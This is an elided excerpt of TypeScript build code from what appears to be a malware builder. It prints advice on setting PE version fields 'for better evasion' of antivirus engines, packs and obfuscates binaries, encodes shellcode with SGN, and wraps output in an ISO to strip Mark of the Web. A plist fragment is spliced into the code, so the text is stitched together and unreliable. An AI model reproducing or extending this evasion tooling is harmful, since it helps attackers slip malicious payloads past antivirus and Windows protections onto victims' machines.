...
import { customPack } from "./custom-packer";
import { createISO } from "./iso-packager";
...
export async function startBuildProcess(
  ...
  try {
    ...
    if (!hasAssemblyData && hasWindowsTargets) {
      sendToStream({
        type: "output",
        text: "⚠ WARNING: No PE version info set (Company, Product, Description, Version). " +
              "Binaries without version info are flagged by most AV engines. " +
              "Set Assembly fields in the build options for better evasion.\n",
        level: "warn",
      });
    }
...
`;
    ...
    for (const platform of platformsToBuild) {
      ...
      try {
        ...
        if (!upxBin && config.useCustomPacker && !isBatWrapper) {
          sendToStream({ type: "output", text: `Compressing ${outputName} with custom packer...\n`, level: "info" });
          const packedPath = filePath + ".packed";
          const ok = await customPack(filePath, packedPath, os, actualArch, !!config.obfuscate, sendToStream);
          if (ok) {
            fs.unlinkSync(filePath);
            fs.renameSync(packedPath, filePath);
            finalSize = Bun.file(filePath).size;
          } else {
            sendToStream({ type: "output", text: `WARNING: Custom packer failed, using uncompressed binary\n`, level: "warn" });
            try { fs.unlinkSync(packedPath); } catch {}
          }
        }
...
<dict>
	...
	<array>
        ...
        if (config.useSgn && shellcodeBinPath && shellcodeArch) {
          const iters = Math.max(1, Math.min(50, Math.floor(config.sgnIterations ?? 3)));
        ...
        if (config.wrapInISO && !shellcodeBinPath) {
          sendToStream({ type: "output", text: `Wrapping ${finalOutputName} in ISO container (strips MOTW)...\n`, level: "info" });
          try {
            const isoOutputName = deps.sanitizeOutputName(finalOutputName.replace(/\.[^.]+$/, ".iso"));
            const isoPath = path.join(outDir, isoOutputName);
            const binaryPath = path.join(outDir, finalOutputName);
            createISO(binaryPath, isoPath, finalOutputName);
            try { fs.unlinkSync(binaryPath); } catch {}
            finalOutputName = isoOutputName;
            finalOutputSize = Bun.file(isoPath).size;
            sendToStream({ type: "output", text: `ISO packaged: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });
          } catch (isoErr: any) {
            sendToStream({ type: "output", text: `WARNING: ISO packaging failed: ${isoErr.message || isoErr}\n`, level: "warn" });
          }
        }
